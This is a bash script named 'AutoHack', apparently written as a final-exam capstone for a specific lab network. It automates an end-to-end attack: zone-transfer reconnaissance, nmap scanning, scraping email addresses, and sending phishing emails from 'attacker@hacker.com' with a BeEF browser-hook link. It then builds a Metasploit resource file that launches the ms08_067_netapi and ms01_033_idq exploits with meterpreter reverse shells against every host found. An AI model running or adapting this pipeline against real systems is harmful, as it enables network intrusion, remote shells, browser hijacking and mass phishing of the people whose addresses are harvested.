#!/bin/bash

# WARNING: THIS CODE WAS WRITTEN VERY BADLY, WITH LITTLE TO NO ERROR CHECKS. 
# IT WAS DESIGNED FOR A VERY SPECIFIC NETWORK! IT WILL BREAK YOUR NETWORK! 
# IT IS RECOMMENED TO ADAPT BEFORE USE OR NOT USE AT ALL AND MERELY READ 
# FOR EDUCATIONAL PURPOSES. USE AT OWN RISK, YOU HAVE BEEN WARNED!

# 1. Run a whois(just to have it)
# 2. Find the nameserver
# 3. Zone transfer the nameserver
# 4. Parse all IP's into /24 networks
# 5. Nmap those networks
# 6. Crawl the website and scrape emails
# 7. Spam all those emails with a beef link
# 8. Exploit (via msf) all vulnerable visible IP's

# end result:
# ---------------------------
# well formated intel file (capstone_info)
# Metasploit shells on vulnerable hosts
# browsers hooked into beef
# full nmap file available

echo "Welcome to AutoHack! this program is designed for a very specific network"
echo "and contrained to a very specific set of tools. This tool was written to"
echo "automaticly generate a metasploit script for autohacking said network, "
echo "as part of a final exam for a class. I make no guarantee that it will work"
echo "for any other network or purpose, and running it could cause damage to"
echo "the targets. PROCEED AT YOUR OWN RISK!"


read -p "Enter Domain: " -e -i "furiousiguana.com" domain

echo
echo Running Whois...
echo ===== Whois ======== > capstone_info
whois $domain | tail -n+5 >> capstone_info

echo DiGGing for nameservers...
echo  ======= Dig ======== >> capstone_info
dig $domain | tail -n+10 >> capstone_info

NS=$(dig +noall +authority $domain | cut -f5)
echo Nameserver[s]: $NS

echo
echo Transfering Zones...
echo ======== Zone Transfer ======= >> capstone_info
# dump zone transfer into file, grep for ips
# reduce to /24 networks, sort uniquely
NETS=$(dig @$NS $domain AXFR +nocmd | grep -v ';;' | tee -a capstone_info | \
grep -o -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | \
sed -E 's|[0-9]+$|0/24|' | sort -u)

echo Running: nmap $NETS
mkdir -p nmap
nmap -T4 -O -sS --traceroute $NETS -oA nmap/$domain >/dev/null

echo
echo scraping $domain for emails...
echo ======= emails ======= | tee -a capstone_info
#very recursively download pages (only php,asp,html) to ./scrape/
wget -qrl10 $domain -P scrape -nd -R png,gif,jpg,exe
#grep all pages for email addresses
emails=$(grep -hioE "[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,6}" scrape/* | sort -u | tee -a capstone_info)
for i in $emails; do echo $i; done

echo
# fetch and confirm mail server to send
read -p "mailserver: " -e -i $(dig @$NS $domain AXFR +nocmd | grep 'MX' | cut -f5|cut -f2 -d' ') MX

#pause to start beef
service beef-xss restart
sleep 5

for i in $emails; do
echo -n "$i: "
# spam out email            $mailserver                                                                     $beef_url
sendemail -f attacker@hacker.com -t $i -s $MX:25 -o message-content-type=html -u click me! -m "meats and stuff <a href='http:/192.168.169.140:3000/demos/butcher/index.html?id=$i'>buy them</a>"
done

#i think capstone_info is done. open it but prevent
#any output from getting in the way.
gedit capstone_info & >/dev/null 2>&1

#clean artifacts
rm scrape/*
rmdir scrape

echo
echo configuring autopwn...
echo "db_import nmap/$domain.xml" > autopwn.rc
echo "use exploit/windows/smb/ms08_067_netapi" >> autopwn.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> autopwn.rc
echo "set LHOST 192.168.169.140" >> autopwn.rc

# comfiguring netapi
VULN=$(grep "445/open/tcp//microsoft-ds" nmap/$domain.gnmap | cut -d' ' -f2)
for i in $VULN; do echo -e "set RHOST $i\nexploit -z\nexploit -z">>autopwn.rc; done

# configuring idq
echo "use exploit/windows/iis/ms01_033_idq" >> autopwn.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> autopwn.rc
echo "set LHOST 192.168.169.140" >> autopwn.rc

VULN=$(grep "80/open/tcp//http" nmap/$domain.gnmap | cut -d' ' -f2)
for i in $VULN; do echo -e "set RHOST $i\nexploit -z">>autopwn.rc; done

echo
echo "[NOTE] Each exploit used to fire twice to help ensure exploits work."
echo "[NOTE] This caused services to become compromised, and crash on the second one."
echo "[NOTE] Because of this, it has been changed to only fire automatically once."
echo "[NOTE] If shell access is less than desired:"
echo "[NOTE] Refire exploits manually with exploit -z"

echo
echo Selected Targets
echo -----------------
grep RHOST autopwn.rc | cut -d' ' -f3

echo
echo To Autohack the World:
echo -----------------------
echo 'msfconsole -r autopwn.rc'

echo
echo "Script Done! happy hacking!"
